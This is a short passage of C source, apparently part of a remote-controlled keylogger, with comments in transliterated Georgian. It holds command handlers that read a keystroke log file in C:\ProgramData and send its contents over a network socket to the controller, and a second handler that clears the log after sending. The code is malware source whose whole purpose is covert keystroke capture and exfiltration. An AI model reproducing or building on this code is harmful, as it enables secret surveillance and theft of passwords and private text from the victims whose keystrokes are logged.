
				else if(buf[0]=='%'&&buf[1]!='d')
				{
						firststart=1;
				char* text=read("C:\\ProgramData\\log.txt");
				send(sock,text,strlen(text),0);

				}
				/////////////// keylogeris buferis gasuftafeba
				else if(buf[0]=='%'&&buf[1]=='d')
				{
					firststart=1;
				char* text=read("C:\\ProgramData\\log.txt");
				char * pasuxi=clear("C:\\ProgramData\\log.txt");
				send(sock,pasuxi,strlen(pasuxi),0);

				}